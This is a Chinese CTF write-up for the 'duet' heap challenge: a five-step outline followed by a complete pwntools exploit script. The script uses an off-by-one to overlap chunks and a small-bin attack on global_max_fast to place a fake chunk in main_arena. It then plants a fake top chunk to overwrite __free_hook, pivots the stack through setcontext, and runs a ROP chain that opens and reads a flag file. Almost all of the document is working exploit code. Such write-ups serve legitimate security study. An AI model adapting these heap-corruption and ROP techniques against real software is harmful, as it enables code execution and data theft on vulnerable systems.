## 利用思路
  1. 通过一次off-by-one的机会改0x200大小的chunk的size为0x2f0，利用这个overlap进行堆风水。
  2. small_bin attack向global_max_fast写一个main_arena范围的地址，这样一来使得所有size的bin都是fast_bin，main_arena里每个位置上存储的就是对应size的fast_bin链的起始地址。
  3. 利用第一步overlap的chunk改写main_arena对应位置的内容，在main_arena里构造一个fake_chunk和假的fast_bin链起始地址，这样就可以calloc到main_arena上。
  4. free_hook-0xb68附近有可以利用的0x100作为size，把main_arena对应位置的值改到这里；在这里写一个fake top chunk size，改main_arena+96处即top chunk的指针到fake top chunk处，这样就可以calloc到libc上。（注意在修改top chunk有一些检查，需要`*(main_arena+0x78) == main_arena+0x60`）。
  5. 用fake top chunk进行几次calloc就可以覆盖到free_hook，布好rop利用rdi进行迁栈就可以了。
## EXP
完整的exp如下：
    #!/usr/bin/python
    #coding=utf-8
    from pwn import *
    context.terminal = ['tmux','splitw','-h']
    qin = 0xb490e7
    se = 0x9f91e7
    if args.R:
        p = remote('pwnable.org',  12356)
    else:
        p = process("./duet")
    def Gong(ind, size, content = ''):
        # Add
        assert ind == 0 or ind == 1
        p.sendlineafter(": ", "1")
        if ind == 0:
            p.sendlineafter("Instrument: ", p32(0xb490e7))
        else:
            p.sendlineafter("Instrument: ", p32(0x9f91e7))
        assert 0x7f < size <= 0x400
        p.sendlineafter("Duration: ", str(size))
        p.sendafter("Score: ", content.ljust(size,'x00'))
    def Shang(ind):
        # Free
        assert ind == 0 or ind == 1
        p.sendlineafter(": ", "2")
        if ind == 0:
            p.sendlineafter("Instrument: ", p32(0xb490e7))
        else:
            p.sendlineafter("Instrument: ", p32(0x9f91e7))
    def Jue(ind):
        # Show (write)
        assert ind == 0 or ind == 1
        p.sendlineafter(": ", "3")
        if ind == 0:
            p.sendlineafter("Instrument: ", p32(0xb490e7))
        else:
            p.sendlineafter("Instrument: ", p32(0x9f91e7))
    def Zhi(byte):
        # calloc(0x88uLL, 1uLL) off-one-byte
        p.sendlineafter(": ", "5")
        assert 0 < byte < 256
        p.sendline(str(byte))
    fake_size = 0xe0
    broken_chunk = 0x1f0
    pad_chunk = 0x240
    #gdb.attach(p,'c')
    #pause()
    for i in range(7):
        Gong(0,broken_chunk)
        Shang(0)
    for i in range(7):
        Gong(0,broken_chunk + fake_size + 0x10)
        Shang(0)
    for i in range(7):
        Gong(0,0x1b0)
        Shang(0)
    for i in range(7):
        Gong(0, 0xf0)
        Shang(0)  
    for i in range(6):
        Gong(0, 0x90)
        Shang(0)   
    for i in range(6):
        Gong(0, 0x80)
        Shang(0)   
    for i in range(7):
        Gong(0, pad_chunk)
        Shang(0)      
    for i in range(7):
        Gong(0,0x100)
        Shang(0)
    Gong(0,0x1b0)
    Gong(1,0x80)
    Shang(0)
    Shang(1)
    Gong(0,0x1b0-0xa0) # 0xa0 unsortedbin
    Shang(0)
    Gong(0,0x1b0)
    Gong(1,broken_chunk)
    Shang(0)
    Gong(0,0x1b0-0x90) # 0x90 unsortedbin
    Shang(0)
    Gong(0,broken_chunk,p64(0)*(fake_size / 8 + 1) + p64(broken_chunk - fake_size + 1))
    Zhi(fake_size + 0x11)
    Shang(1)
    Gong(1, 0x3f0,'x00'*0x48 + p64(0x401-0x50))
    Shang(1)
    Gong(1,pad_chunk,'x00'*0x1f8 + p64(0x201))
    Shang(0)
    Jue(1)
    p.recvuntil(": ")
    p.recvn(0x200)
    heap = u64(p.recv(8))
    main_arena = u64(p.recv(8))
    main_arena -= 96
    libc_base = main_arena - 0x10 - 0x1E4C30
    global_max_fast = libc_base + 0x1e7600
    free_hook = libc_base + 0x1E75A8
    initial = free_hook - 0xb68
    log.info('heap : %s' % hex(heap))
    log.info('libc_base : %s' % hex(libc_base))
    log.info('main_arena : %s' % hex(main_arena))
    log.info('global_max_fast : %s' % hex(global_max_fast))
    log.info('free_hook : %s' % hex(free_hook))
    payload = 'x00'*0x48+p64(0xa1)+ p64(heap-1344)+p64(global_max_fast -0x10) # fake 0xa0 small chunk
    payload += 'x00'*0x80 + p64(0xa0) +p64(0x110)
    Gong(0, 0xf0, payload)  
    Shang(0)
    Gong(0, 0x90)
    log.info('global_max_fast changed') 
    Shang(0)
    Shang(1)
    payload = 'x00'*0x1f8 + p64(0xe1)
    Gong(1,0x248,payload)
    Shang(1)
    payload = 'x00'*0x48 + p64(0x201)
    Gong(0,0xd0,payload)
    payload = p64(0) + p64(0x201) + p64(0) + p64(0x191) + p64(0) + p64(0x181) + p64(0) + p64(0x171) + p64(0) + p64(0x161) + p64(0) + p64(0x151) + p64(0) + p64(0x141)
    payload += p64(0) + p64(0x131) + p64(0) + p64(0x121) + p64(0) + p64(0x111) + p64(0) + p64(0x101) + p64(0) + p64(0xf1)
    Gong(1,0x1f0,payload.rjust(0xf0,'x00'))
    Shang(1)
    payload = 'x00'*0x1f8 + p64(0x91)
    Gong(1,0x248,payload)
    Shang(1)
    Shang(0)
    payload = 'x00'*0x1f8 + p64(0x91) + p64(0x111)
    Gong(1,0x248,payload)
    Shang(1)
    Gong(0,0x80, 'x00'*0x48 + p64(0x81))
    payload = 'x00'*0x1f8 + p64(0x111)
    Gong(1,0x248,payload)
    Shang(1)
    Shang(0)
    payload = 'x00'*0x1f8 + p64(0x111) + p64(main_arena + 64)
    Gong(0,0x248,payload)
    Gong(1,0x100, 'x00'*0x48 + p64(0x201) + 'x00'*0x70 + p64(0) + p64(0x161) + p64(0) + p64(0x151) + p64(0) + p64(0x141) + p64(0) + p64(0x131))
    Shang(0)
    payload = 'x00'*0x1f8 + p64(0xe1)
    Gong(0,0x248,payload)
    Shang(0)
    Shang(1)
    top_chunk = initial + 0x10
    payload = 'x00'*0x10 + p64(top_chunk) + 'x00'*0xc8 + p64(main_arena + 304) + p64(304*2 + 1)
    Gong(0,0x100,payload)
    payload = 'x00'*0x18 + p64(0x21)
    Gong(1,304*2-0x10,payload)
    Shang(0)
    pad = main_arena + 0x60
    payload = p64(pad)*2 + p64(top_chunk) + p64(pad)*3 + p64(free_hook-0xb68-1) + p64(pad)*22 + p64(0x21)
    Gong(0,0x100,payload)
    Shang(0)
    Shang(1)
    pop_rdi = libc_base + 0x0000000000026542
    pop_rsi = libc_base + 0x0000000000026f9e
    pop_rdx = libc_base + 0x000000000012bda6
    pop_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x000000000010CF7F
    flag = free_hook + 8
    read_addr = libc_base + 0x10CF70
    write_addr = libc_base + 0x10D010
    ropchain = p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(4) + p64(pop_rax) + p64(2) + p64(syscall)
    ropchain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x20) + p64(read_addr)
    ropchain += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(0x20) + p64(write_addr)
    Gong(0,0xf8,'x00' + p64(0) + p64(0x21001))
    payload = p64(pad)*2 + p64(top_chunk) + p64(pad)*3
    Gong(1,0x100,payload)
    Shang(1)
    Gong(1,0x400,'aaaaaaaa')
    Shang(1)
    Gong(1,0x400,'aaaaaaaa')
    Shang(1)
    setcontext = libc_base + 0x55E35
    tar = free_hook - 0x328
    rdx = tar + 0xe0-0xa0 -8
    tar_rsp = tar + 0xe0
    io_wfile_sync = 0x89460 + libc_base
    payload = p64(0) + p64(1) + p64(2) + p64(rdx)*4 + 'x00'*0x60 + p64(tar+0xb0) # 0xa0
    payload += p64(tar) + p64(0) # 0xb0
    payload += 'x00'*0x20 + p64(setcontext) + p64(tar_rsp + 8) #0xe0
    payload += ropchain
    payload = payload.ljust(0x328,'x00') + p64(io_wfile_sync) + './flagx00'
    Gong(1,0x400,payload)
    Shang(1)
    p.interactive()